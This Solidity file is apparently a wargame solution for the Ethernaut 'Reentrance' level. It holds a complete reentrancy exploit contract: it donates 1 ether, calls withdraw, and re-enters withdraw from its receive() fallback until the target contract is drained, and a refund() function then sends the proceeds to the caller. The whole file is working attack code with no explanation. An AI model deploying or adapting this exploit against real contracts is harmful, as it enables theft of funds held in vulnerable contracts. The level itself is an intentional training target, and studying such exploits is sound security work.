pragma solidity ^0.6.12;

import "../levels/Reentrance.sol";

contract ReentrancyAttackFixed {
    Reentrance public reentrance;

    constructor(address payable reentranceAddress) public {
        reentrance = Reentrance(reentranceAddress);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        reentrance.donate{value: 1 ether}(address(this));
        reentrance.withdraw(1 ether);
    }

    receive() external payable {
        if (address(reentrance).balance >= 1 wei) {
            reentrance.withdraw(1 ether);
        }
    }

    function refund() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}